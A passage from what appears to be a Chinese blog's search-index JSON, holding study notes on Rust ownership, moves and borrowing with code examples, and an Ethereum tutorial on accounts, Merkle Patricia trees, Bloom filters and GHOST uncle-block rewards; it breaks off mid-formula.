Java 为代表的，垃圾回收机制自动管理内存。\n<ul>\n<li>优点：方便，程序员不需要在意内存何时释放，不会发生内存泄露</li>\n<li>缺点：需要频繁扫描追踪分配的对象，慢</li>\n</ul></li>\n</ul>\n<p>而 Rust\n为了同时实现安全和高效两个目标，提出了<strong>所有权</strong>的机制。</p>\n<ul>\n<li>为了安全，就不能完全放任程序员负责内存分配，编写代码的过程中需要有所限制。</li>\n<li>为了高效，在运行阶段不能频繁进行内存检查，所以保证内存安全的算法必须在\n<strong>编译</strong> 过程实现。</li>\n</ul>\n<h1 id=\"拷贝与移动\">1 拷贝与移动</h1>\n<p>首先，简单变量类型（整型、浮点数等，以及仅包含简单类型的元组和数组），他们的长度固定，直接压入栈中就行。只在栈上的数据赋值时进行的是<strong>拷贝（<em>copy</em>）</strong>操作。</p>\n<p>即每次赋值时都会在栈内压入一个新的值，就是最符合直觉的实现。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">y</span> = x;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"x = {}, y = {}\"</span>, x, y);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>此时栈中有两个 <code>5</code> ，分别所属于 <code>x</code> 和\n<code>y</code>。</p>\n<blockquote>\n<p>这里说简单变量类型不够严谨，准确说是实现了 Copy trait 的类型。</p>\n</blockquote>\n<p>对于复杂类型的变量，例如 <code>String</code>\n，需要在堆中分配空间，在栈中压入一个<strong>指针</strong>，指向堆中的空间。</p>\n<figure>\n<img src=\"/rust/3-%E6%89%80%E6%9C%89%E6%9D%83/202407292226831.svg\" alt=\"String in memory\">\n<figcaption aria-hidden=\"true\">String in memory</figcaption>\n</figure>\n<p>此类变量的类型在 Rust 中显示为 <code>{unknown}</code> ，</p>\n<figure>\n<img src=\"/rust/3-%E6%89%80%E6%9C%89%E6%9D%83/202407292223784.png\" alt=\"image-20240729222344611\">\n<figcaption aria-hidden=\"true\">image-20240729222344611</figcaption>\n</figure>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"type\">String</span>::<span class=\"title function_ invoke__\">from</span>(<span class=\"string\">\"hello\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">y</span> = x;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"x = {}, y = {}\"</span>, x, y); <span class=\"comment\">// 报错，x无法使用</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>在执行 <code>let y = x;</code>\n时，并不是像其他语言那样浅拷贝，创建了第二个指针 <code>y</code>\n指向相同的内存空间。</p>\n<p>而是类似于执行：<code>y = std::move(x)</code> ，之后 <code>x</code>\n就无法再使用了。</p>\n<p>这个特性使得可以确保字符串 <code>hello</code>\n的内存空间<strong>仅所属于一个变量</strong>。</p>\n<p>这样做的好处是，堆空间的生命周期与变量的作用域强绑定。当\n<code>y</code> 离开作用域时，就释放 <code>y</code> 所指的内存空间。</p>\n<p>同样的，默认的函数传参过程也是执行 <code>move</code>：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"type\">String</span>::<span class=\"title function_ invoke__\">from</span>(<span class=\"string\">\"hello\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">y</span> = x;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">test</span>(y);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"x = {}, y = {}\"</span>, x, y); <span class=\"comment\">// 报错，x、y均无法使用</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">test</span>(s: <span class=\"type\">String</span>) {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, s);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>Rust\n里没有浅拷贝的概念，并且默认情况下绝对不会隐式进行深拷贝，所以这种赋值操作都可以被认为是非常高效的。</p>\n<p>如果要深拷贝，使用 <code>clone</code> 方法。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">x</span> = <span class=\"type\">String</span>::<span class=\"title function_ invoke__\">from</span>(<span class=\"string\">\"hello\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">y</span> = x.<span class=\"title function_ invoke__\">clone</span>();</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">test</span>(y.<span class=\"title function_ invoke__\">clone</span>());</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"x = {}, y = {}\"</span>, x, y); </span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">test</span>(s: <span class=\"type\">String</span>) {</span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, s);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure>\n<img src=\"/rust/3-%E6%89%80%E6%9C%89%E6%9D%83/202407292253395-2850267.svg\" alt=\"s1 and s2 to two places\">\n<figcaption aria-hidden=\"true\">s1 and s2 to two places</figcaption>\n</figure>\n<p>总结一下，就是这个非常暴力、强硬的规则，保证了 Rust 的内存安全：</p>\n<ul>\n<li>一个内存空间，有且仅有一个变量具有其所有权</li>\n<li>当这个变量离开作用域时，自动销毁其内存空间</li>\n</ul>\n<p>在 Rust\n里就不会有多个指针共同拥有一段空间的所有权，也不会有指向非法空间的指针，也不会有没有被指针指向的内存空间。</p>\n<p>这使得 Rust 不需要手动释放内存，也不需要运行时垃圾回收。Rust\n为了内存安全做出的牺牲就是这套强硬的规则。</p>\n<h1 id=\"引用和借用\">2 引用和借用</h1>\n<p>但是这个规则导致了某些情况非常麻烦，例如函数传参。</p>\n<p>这是非常可笑的，把一个变量的所有权传给了一个函数，函数结束后这个变量和对应的内存空间也就被销毁了。返回原逻辑后这个参数就无法使用了。</p>\n<p>所以 Rust 还提供了 <strong>引用</strong> 的概念。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">s1</span> = <span class=\"type\">String</span>::<span class=\"title function_ invoke__\">from</span>(<span class=\"string\">\"hello\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">len</span> = <span class=\"title function_ invoke__\">calculate_length</span>(&amp;s1);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"The length of '{}' is {}.\"</span>, s1, len);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">calculate_length</span>(s: &amp;<span class=\"type\">String</span>) <span class=\"punctuation\">-&gt;</span> <span class=\"type\">usize</span> {</span><br><span class=\"line\">    s.<span class=\"title function_ invoke__\">len</span>()</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure>\n<img src=\"/rust/3-%E6%89%80%E6%9C%89%E6%9D%83/202407292254851.svg\" alt=\"&String s pointing at String s1\">\n<figcaption aria-hidden=\"true\">&amp;String s pointing at String\ns1</figcaption>\n</figure>\n<p>这些 &amp; 符号就是\n<strong>引用</strong>，它们允许你使用值但不获取其所有权。</p>\n<p>应用的变量被离开作用域时，不会释放内存空间。这很正常，因为只有具有所有权的变量离开作用域时才会释放内存空间，而引用不具有所有权。</p>\n<p>同样的，默认情况下引用是 <strong>只读</strong>\n的。必须显示的规定引用的 <strong>可写</strong> 性：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"keyword\">mut </span><span class=\"variable\">s</span> = <span class=\"type\">String</span>::<span class=\"title function_ invoke__\">from</span>(<span class=\"string\">\"hello\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">change</span>(&amp;<span class=\"keyword\">mut</span> s);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">change</span>(some_string: &amp;<span class=\"keyword\">mut</span> <span class=\"type\">String</span>) {</span><br><span class=\"line\">    some_string.<span class=\"title function_ invoke__\">push_str</span>(<span class=\"string\">\", world\"</span>);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>首先，我们必须将 <code>s</code> 改为 <code>mut</code>。然后必须在调用\n<code>change</code> 函数的地方创建一个可变引用\n<code>&amp;mut s</code>，并更新函数签名以接受一个可变引用\n<code>some_string: &amp;mut String</code>。这就非常清楚地表明，<code>change</code>\n函数将改变它所借用的值。</p>\n<p>这样的好处是，程序员可以非常清楚的知道我所调用的函数有没有可能会修改我提供的变量，能够使得函数调用更加的解耦。</p>\n<hr>\n<p>为了防止数据冲突，Rust 对引用和借用也有限制。简单来说，就是：</p>\n<ul>\n<li>写写冲突</li>\n<li>读写冲突</li>\n</ul>\n<p>看下面两段代码：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"keyword\">mut </span><span class=\"variable\">x</span> = <span class=\"type\">String</span>::<span class=\"title function_ invoke__\">from</span>(<span class=\"string\">\"hello\"</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">y</span> = &amp;<span class=\"keyword\">mut</span> x; \t\t<span class=\"comment\">// y 的生命周期开始</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">z</span> = &amp;x;\t\t\t\t<span class=\"comment\">// 报错，读写冲突</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">z_mut</span> = &amp;<span class=\"keyword\">mut</span> x;\t\t<span class=\"comment\">// 报错，写写冲突</span></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, y);\t\t<span class=\"comment\">// y 的生命周期结束</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>在可变引用 <code>y</code> 的生命周期内，不能有任何其他引用。</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"keyword\">mut </span><span class=\"variable\">x</span> = <span class=\"type\">String</span>::<span class=\"title function_ invoke__\">from</span>(<span class=\"string\">\"hello\"</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">y</span> = &amp;x; \t\t\t<span class=\"comment\">// y 的生命周期开始</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">z</span> = &amp;x;\t\t\t\t<span class=\"comment\">// 不报错，可以同时读取不会造成冲突</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">z_mut</span> = &amp;<span class=\"keyword\">mut</span> x;\t\t<span class=\"comment\">// 报错，读写冲突</span></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">println!</span>(<span class=\"string\">\"{}\"</span>, y);\t\t<span class=\"comment\">// y 的生命周期结束</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>在不可变引用 <code>y</code> 的生命周期内，不能有可变引用。</p>\n<p>总结一下，Rust\n同样有一个严苛的规则，强行保证了变量不会发生访问冲突。</p>\n<h1 id=\"总结\">总结</h1>\n<p>现在 Rust\n给我一种暴力美学的感觉，用非常严格的规则在编译阶段限制死了可能存在的安全问题。</p>\n<p>另外还有一个<strong>切片(<em>slice</em>)</strong>的概念，我感觉就是对数组的局部引用，很直观，是某种特殊的引用（不一定引用整体，可以引用局部），就没有什么值得单独写的。</p>\n","categories":["笔记"],"tags":["学习笔记","Rust"]},{"title":"区块链技术与应用02 - 以太坊","url":"/blockchain/tutorial/tutorial-02/","content":"<p><del>我已经完全了解比特币了！</del>接下来看以太坊。</p>\n<span id=\"more\"></span>\n<h1 id=\"以太坊概述\">1 以太坊概述</h1>\n<ul>\n<li>吞吐率提高：出块时间大幅降低</li>\n<li>挖矿基址修改：对内存要求很高，用于resistance</li>\n<li>（在后来）工作量证明PoW → 权益证明PoS</li>\n<li>智能合约支持</li>\n</ul>\n<h1 id=\"账户\">2 账户</h1>\n<p>优点：</p>\n<ul>\n<li>基于账户而不是基于账本，更自然</li>\n<li>天然能够防御双花攻击</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>重放攻击，解决方案是在交易里加一个\nnonce，记录一下一共发布过多少个交易</li>\n</ul>\n<blockquote>\n<p>双花攻击和重放攻击是<strong>对称的</strong></p>\n<p>双花是花钱的人不诚实</p>\n<p>重放是收钱的人不诚实</p>\n</blockquote>\n<h2 id=\"账户类型\">2.1 账户类型</h2>\n<h3 id=\"外部账户\">外部账户</h3>\n<p>正常的公私钥对创建的账户。</p>\n<ul>\n<li>账户余额 balance</li>\n<li>交易次数 nonce（和比特币的 nonce 不一样）</li>\n</ul>\n<h3 id=\"合约账户\">合约账户</h3>\n<ul>\n<li>账户余额 balance</li>\n<li>交易次数 nonce</li>\n<li>代码 code</li>\n<li>存储 storage</li>\n</ul>\n<h1 id=\"状态树\">3 状态树</h1>\n<p>为什么不能直接做一个地址到状态的哈希表映射？哈希表有什么问题？</p>\n<p>要保证账户的内容没有被篡改，要把所有账号构成默克尔树，保证全节点之间状态的一致性，也可以作为Merkle\nProof。</p>\n<p>如果用哈希表，每次要把哈希表的所有key\nvalue构成一个默克尔树，这个过程开销太大。</p>\n<p>如果使用默克尔树，每次查询账户的效率太低。</p>\n<p>如果使用排序默克尔树，每次新增账户的时候，又要重新构成一个默克尔树。</p>\n<p>所以，要有一个数据结构，满足以下要求：</p>\n<ul>\n<li>可以轻易证明所有内部元素没有被篡改</li>\n<li>可以快速查询、修改每个元素</li>\n<li>可以快速新增元素</li>\n</ul>\n<h2 id=\"trie字典树-与-pt\">3.0 trie（字典树） 与 PT</h2>\n<p>字典树的结构略。</p>\n<p>Patricia trie，压缩前缀树：</p>\n<p><img src=\"/blockchain/tutorial/tutorial-02/image-20250122155243308.png\" alt=\"image-20250122155243308\" style=\"zoom:50%;\"></p>\n<p>节省空间，提高搜索效率。在单词稀疏的情况下效果拔群。</p>\n<p>而以太坊的地址，显然是非常稀疏的。（因为地址空间是 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"3.719ex\" height=\"1.887ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -833.9 1643.7 833.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msup\"><g data-mml-node=\"mn\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(533,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/><path data-c=\"36\" d=\"M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z\" transform=\"translate(500,0)\"/><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\" transform=\"translate(1000,0)\"/></g></g></g></g></g></svg></mjx-container></span>\n，目前产生的地址数量远远达不到这个）</p>\n<h2 id=\"mptmerkle-patricia-tree\">3.1 MPT（Merkle Patricia Tree）</h2>\n<p>把PT的普通指针换成哈希指针，就得到了一个根哈希值。</p>\n<p>并且查询效率很高，最多访问40次内存。修改也只用修改这一条路径上的哈希值，最多不超过40次。</p>\n<p>以太坊用到的事 Modified MPT，还做了一些修改。</p>\n<figure>\n<img src=\"/blockchain/tutorial/tutorial-02/image-20250122160533926.png\" alt=\"image-20250122160533926\">\n<figcaption aria-hidden=\"true\">image-20250122160533926</figcaption>\n</figure>\n<p>合约账户里的存储 Storage\n也是MPT。更新哪里，就把这一条路径的默克尔树分支修改，其他直接指向之前的</p>\n<figure>\n<img src=\"/blockchain/tutorial/tutorial-02/image-20250122161645346.png\" alt=\"image-20250122161645346\">\n<figcaption aria-hidden=\"true\">image-20250122161645346</figcaption>\n</figure>\n<h2 id=\"区块构成\">3.2 区块构成</h2>\n<figure>\n<img src=\"/blockchain/tutorial/tutorial-02/image-20250122162349393.png\" alt=\"image-20250122162349393\">\n<figcaption aria-hidden=\"true\">image-20250122162349393</figcaption>\n</figure>\n<h1 id=\"交易树和收据树\">4 交易树和收据树</h1>\n<p>数据结构都是 MPT 。块头里存了每个树的树根，并且有一个 Bloom\n，是交易树和收据树的 bloom filter 的并。</p>\n<ul>\n<li>交易树中存的是区块中所有的交易数据</li>\n<li>收据树中存的是所有交易的执行结果</li>\n</ul>\n<h2 id=\"bloom-filter\">4.1 bloom filter</h2>\n<p>高效的查找某一个元素是不是在一个大集合里。</p>\n<p>保存一个大集合的摘要（例如一个128位的数）。</p>\n<p>集和中的元素哈希后得到 0~127 的数字，将对应的位数变为 1\n。（初始均为0）</p>\n<p>下面要查找一个元素在不在集合中，先计算他的哈希值，如果对应位置为 0\n，则说明该元素一定不在集合中；如果对应位置为\n1，由于可能存在哈希碰撞，并不能确定该元素存在集合中。</p>\n<p>举一个实际的应用例子：要找到最近100个区块内哪个区块里有执行某个智能合约的交易，先在块头的\nBloom\n里查看对应的位置是否为1，就可以排除一部分绝对不存在该智能合约的区块，以此提高搜索效率。即<strong>快速过滤无关区块</strong>。</p>\n<h2 id=\"为什么以太坊有收据树\">4.2 为什么以太坊有收据树</h2>\n<p>比特币的主要目标是作为一个去中心化的数字货币系统，因此交易是其核心功能。因此比特币只需要交易树（Merkle\nTree）来记录区块中的所有交易。</p>\n<p>比特币的交易模型是简单的\nUTXO（未花费交易输出）模型，所有状态变化（账户余额的变化）都可以直接通过交易记录推导出来，不需要额外的数据结构来保存中间结果。</p>\n<p>以太坊中有收据树，因为以太坊需要支持复杂的智能合约和状态变化，收据树用于记录交易执行结果（状态、gas、日志等），提高了验证效率，支持了更丰富的功能。</p>\n<h1 id=\"共识机制-ghost\">5 共识机制-GHOST</h1>\n<h2 id=\"ghost-最初版本\">5.1 GHOST 最初版本</h2>\n<p>因为出块时间大大缩短，产生分叉的概率很大。</p>\n<p>为了避免大量矿工做无用功（挖出来的区块不能成为最长合法链），以太坊也要给这些区块一些奖励。</p>\n<p>这些区块（orphan block）在以太坊里成为了叔叔区块（uncle\nblock，和现区块的parent block是兄弟），uncle block 可以得到 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.816ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.795ex\" height=\"2.789ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -872 793.6 1232.6\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mn\" transform=\"translate(220,394) scale(0.707)\"><path data-c=\"37\" d=\"M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(220,-345) scale(0.707)\"><path data-c=\"38\" d=\"M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z\"/></g><rect width=\"553.6\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span> 倍的出块奖励。</p>\n<p>当前区块如果包含一个叔叔区块，可以得到 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.816ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.595ex\" height=\"2.773ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -864.9 1147.1 1225.5\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mn\" transform=\"translate(396.8,394) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(220,-345) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\" transform=\"translate(500,0)\"/></g><rect width=\"907.1\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span>\n倍额外的出块奖励。一个区块最多可以包含两个叔叔区块。</p>\n<p>这鼓励区块快速合并。（如果想要拿到作为叔叔区块的出块奖励，就沿着最长合法链继续挖就行了，不用因为担心自己的区块白白浪费而坚持自己的链）</p>\n<p>如果有3个叔叔区块呢？</p>\n<p>如果已经开始挖下一个区块，才知道叔叔区块的存在？</p>\n<p>如果矿池之间存在竞争关系，故意不把别的矿池的区块包含进叔叔区块？</p>\n<h2 id=\"改进版本\">5.2 改进版本</h2>\n<p>叔叔区块并不一定是“上一辈”，爷爷辈、曾祖父辈，也是叔叔区块。</p>\n<p>考虑之前的三个问题：</p>\n<ul>\n<li>有2个以上的叔叔区块：后面的孙子、曾孙子区块会再慢慢把这些区块包含进去，迟早会得到奖励。</li>\n<li>第二个问题同上，留给孙子和后代们。</li>\n<li>矿池竞争中，如果自己不包含，总会有别人包含，不损人只不利己。</li>\n</ul>\n<p>每个区块还是只能包含两个叔叔区块，如果叔叔区块很多（曾祖父，曾曾曾曾祖父）选哪一个包含？</p>\n<p>叔叔区块的产生时间怎么限制？我能不能现在挖1000个区块以前的叔叔区块，因为那时候挖矿难度低、出块奖励高，然后等着被后代包含？</p>\n<h2 id=\"进一步改进\">5.3 进一步改进</h2>\n<figure>\n<img src=\"/blockchain/tutorial/tutorial-02/image-20250125135006451.png\" alt=\"image-20250125135006451\">\n<figcaption aria-hidden=\"true\">image-20250125135006451</figcaption>\n</figure>\n<p>7代以内，才算叔叔区块，并且出块奖励递减。</p>\n<p>以此鼓励挖最新的区块。也节省了维护的状态数量。以此也鼓励尽早合并。</p>\n<p>当前区块如果包含一个叔叔区块，可以得到 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.816ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.595ex\" height=\"2.773ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -864.9 1147.1 1225.5\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mn\" transform=\"translate(396.8,394) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(220,-345) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 